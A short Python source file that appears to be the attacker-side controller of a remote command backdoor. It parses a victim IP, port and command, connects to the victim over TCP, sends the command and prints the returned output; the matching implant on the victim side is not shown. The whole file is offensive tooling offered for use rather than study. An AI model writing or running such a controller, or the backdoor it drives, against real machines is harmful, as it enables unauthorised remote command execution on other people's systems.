import socket
import sys
from Utils.argument_parser import attacker_parse_arguments

def start_client(host='192.168.1.78', port=8000, command=''):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((host, port))
    except Exception as e:
        print(f"Failed to connect to the server: {e}")
        return

    try:
        client_socket.sendall(command.encode('utf-8'))

        # Receive the command output from the server
        data = client_socket.recv(4096).decode('utf-8')
        print(f"Output:\n{data}")
    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        client_socket.close()
        print("Disconnected from the server.")

if __name__ == '__main__':
    victim_ip, victim_port, command = attacker_parse_arguments()

    start_client(host = victim_ip, port = victim_port, command=command)
